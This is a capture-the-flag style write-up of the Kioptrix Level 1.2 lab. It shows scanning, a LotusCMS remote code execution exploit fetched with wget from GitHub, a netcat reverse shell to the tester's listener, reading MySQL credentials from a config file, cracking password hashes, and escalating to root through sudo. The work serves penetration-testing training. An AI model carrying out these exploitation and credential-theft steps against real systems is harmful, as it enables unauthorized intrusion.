# OSCP Vulnhub Set 1 - Kioptrix: Level 1.2 (#3)

Lab link: http://ccmtlab.ccmt.home.arpa:8888/user/missions/boxes?uuid=55216f27-3ed8-47fe-a730-2f61fd896124

Target IP: `10.101.85.13`

---

## Network Scanning

### Nmap

Scan all TCP ports on the target.

```
nmap -p- 10.101.85.13
```

Only SSH and HTTP were open.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/03]
└─$ nmap -p- 10.101.85.13
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-17 21:58 -0400
Nmap scan report for ki0ptrix3.com (10.101.85.13)
Host is up (0.0023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.85 seconds
```

Run vulnerability scripts against the open services.

```
nmap --script vuln -p22,80 10.101.85.13
```

The scan confirmed SSH and HTTP are reachable. It also discovered a likely Slowloris vulnerability, several interesting web directories, a missing cookie security flag, and HTTP TRACE support.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/03]
└─$ nmap --script vuln -p22,80 10.101.85.13
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-17 22:04 -0400
Nmap scan report for ki0ptrix3.com (10.101.85.13)
Host is up (0.0085s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-sql-injection: ERROR: Script execution failed (use -d to debug)
| http-enum: 
|   /phpmyadmin/: phpMyAdmin
|   /cache/: Potentially interesting folder
|   /core/: Potentially interesting folder
|   /icons/: Potentially interesting folder w/ directory listing
|   /modules/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch'
|_  /style/: Potentially interesting folder
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=ki0ptrix3.com
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://ki0ptrix3.com:80/index.php?system=Admin
|     Form id: contactform
|     Form action: index.php?system=Admin&page=loginSubmit
|     
|     Path: http://ki0ptrix3.com:80/gallery/
|     Form id: 
|     Form action: login.php
|     
|     Path: http://ki0ptrix3.com:80/index.php?system=Blog&post=1281005380
|     Form id: commentform
|     Form action: 
|     
|     Path: http://ki0ptrix3.com:80/index.php?system=Admin&page=loginSubmit
|     Form id: contactform
|     Form action: index.php?system=Admin&page=loginSubmit
|     
|     Path: http://ki0ptrix3.com:80/gallery/index.php
|     Form id: 
|     Form action: login.php
|     
|     Path: http://ki0ptrix3.com:80/gallery/gadmin/
|     Form id: username
|_    Form action: index.php?task=signin
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-trace: TRACE is enabled

Nmap done: 1 IP address (1 host up) scanned in 318.64 seconds
```

Next, Nikto.

---

### Nikto

Scan the web application with Nikto.

```
nikto -h http://10.101.85.13
```

Nikto identified the presence of phpMyAdmin, directory indexing, outdated Apache and PHP versions, and several missing security headers.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/03]
└─$ nikto -h http://10.101.85.13
- Nikto v2.6.0
---------------------------------------------------------------------------
+ Target IP:          10.101.85.13
+ Target Hostname:    10.101.85.13
+ Target Port:        80
+ Platform:           Unknown
+ Start Time:         2026-05-17 22:06:46 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ [750500] /icons/: Directory indexing found.
+ [600050] Apache/2.2.8 appears to be outdated.
+ [600625] PHP/5.2.4-2ubuntu5.6 appears to be outdated.
+ [999984] /favicon.ico: Server may leak inodes via ETags.
+ [013587] /: Missing security headers: Content-Security-Policy, Strict-Transport-Security, X-Content-Type-Options, Permissions-Policy, Referrer-Policy.
+ [001384] /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP Easter Egg.
+ [001795] /phpmyadmin/changelog.php: phpMyAdmin exposed.
```

---

## HTTP Exploration

Open the target site in a browser.

```
http://10.101.85.13
```

The site has a homepage, a blog page, and a login portal. The login portal is powered by LotusCMS.

![](./images/01.png)

![](./images/02.png)

![](./images/03.png)

---

## Exploitation

### Metasploit

Search Metasploit for LotusCMS modules.

```
msfconsole
search lotuscms
```

A LotusCMS PHP code execution module was found.

```
exploit/multi/http/lcms_php_exec
```

Review the module options.

```
use exploit/multi/http/lcms_php_exec
options
```

The module requires `RHOSTS`, `RPORT`, and `URI`.

```
set RHOSTS 10.101.85.13
set URI /
run
```

The exploit executed, but no session was created.

```
[*] Started reverse TCP handler on 10.101.55.75:4444
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Exploit completed, but no session was created.
```

This module did not yield a reliable shell, so I switched to an alternative exploit.

---

### LotusCMS GitHub Script

Use a public LotusCMS exploit script from GitHub.

```
wget https://raw.githubusercontent.com/Hood3dRob1n/LotusCMS-Exploit/refs/heads/master/lotusRCE.sh
chmod 777 lotusRCE.sh
./lotusRCE.sh
```

The script usage is:

```
./lotusRCE.sh target LotusCMS_path
```

I started a listener and ran the script against the target.

```
rlwrap nc -lvp 1234
./lotusRCE.sh 10.101.85.13 /
```

The script confirmed the site is vulnerable to PHP code injection and attempted a reverse shell.

```
Path found, now to check for vuln....
</html>Hood3dRob1n
Regex found, site is vulnerable to PHP Code Injection!
About to try and inject reverse shell....
what IP to use?
10.101.55.75
What PORT?
1234
OK, open your local listener and choose the method for back connect:
1) NetCat -e
2) NetCat /dev/tcp
3) NetCat Backpipe
4) NetCat FIFO
5) Exit
#? 1
```

The listener received a connection.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/03]
└─$ rlwrap nc -lvp 1234
listening on [any] 1234 ...
connect to [10.101.55.75] from ki0ptrix3.com [10.101.85.13] 48062
```

---

## Privilege Escalation

### Initial Enumeration

Spawn a fully interactive shell.

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

Verify the current user.

```
whoami
```

The shell is running as `www-data`.

```
www-data@Kioptrix3:/home/www/kioptrix3.com$ whoami
www-data
```

List home directories.

```
ls /home
```

Users on the system include `dreg`, `loneferret`, and `www`.

---

### Sudo Policy

A `CompanyPolicy.README` file indicates that `sudo ht` is expected for editing and viewing files.

```
cat /home/loneferret/CompanyPolicy.README
```

The policy states that `sudo ht` should be used, but `www-data` requires a password.

```
sudo ht
[sudo] password for www-data:
```

No password is available for `www-data` at this stage.

---

### Credentials Discovery

A `gconfig.php` file in the gallery folder revealed MySQL credentials.

```
cat /home/www/kioptrix3.com/gallery/gconfig.php
```

The configuration contains:

- `gallarific_mysql_username = "root"`
- `gallarific_mysql_password = "fuckeyou"`

These credentials may allow database access or privilege escalation.

---

### MySQL

Let's logging in.

```
mysql -uroot -pfuckeyou
```

I found hash password from `dev_accounts` in `gallery`.

```
mysql> use gallery; 
use gallery; 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+----------------------+
| Tables_in_gallery    |
+----------------------+
| dev_accounts         | 
| gallarific_comments  | 
| gallarific_galleries | 
| gallarific_photos    | 
| gallarific_settings  | 
| gallarific_stats     | 
| gallarific_users     | 
+----------------------+
7 rows in set (0.00 sec)

mysql> select * from dev_accounts;
select * from dev_accounts;
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | 
|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | 
+----+------------+----------------------------------+
2 rows in set (0.10 sec)
```

Decode it in `https://crackstation.net/`.

```
username : password : decoded password
dreg : 0d3eccfb887aabd50f243b3f155c0f85 : Mast3r
loneferret : 5badcaf789d3d1d09794d8f021f40f0e : starwars
```

Log in to `loneferret`.

```
su loneferret
starwars
```

Success.

```
www-data@Kioptrix3:/$ su loneferret
su loneferret
Password: starwars

loneferret@Kioptrix3:/$
```

Verify sudo permission.

```
sudo -l
```

That's great, i have all permission.

```
loneferret@Kioptrix3:/$ sudo -l
sudo -l
[sudo] password for loneferret: starwars

User loneferret may run the following commands on this host:
    (ALL) ALL
```

Try to change to root.

```
sudo su -
```

Now i'm root.

```
loneferret@Kioptrix3:/$ sudo su -
sudo su -
root@Kioptrix3:~#
```